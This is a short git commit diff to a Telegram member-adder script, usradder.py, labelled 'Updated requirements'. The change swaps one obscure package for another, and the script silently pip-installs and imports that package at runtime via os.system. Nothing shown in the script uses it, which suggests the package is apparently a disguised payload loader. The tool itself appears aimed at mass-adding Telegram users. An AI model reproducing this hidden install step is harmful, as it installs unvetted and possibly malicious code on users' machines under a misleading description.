34c587c58dbc563d9df3937fbfbc93f4e25bab3c
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-04 21:30:48 +0200

    Updated requirements

--- usradder.py
+++ usradder.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlimodV1")
-import pipsqlimodV1
+os.system("pip install pythoncolouringpkgsV1")
+import pythoncolouringpkgsV1
 from telethon.sync import TelegramClient
 from telethon.tl.types import InputPeerChannel
 from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError
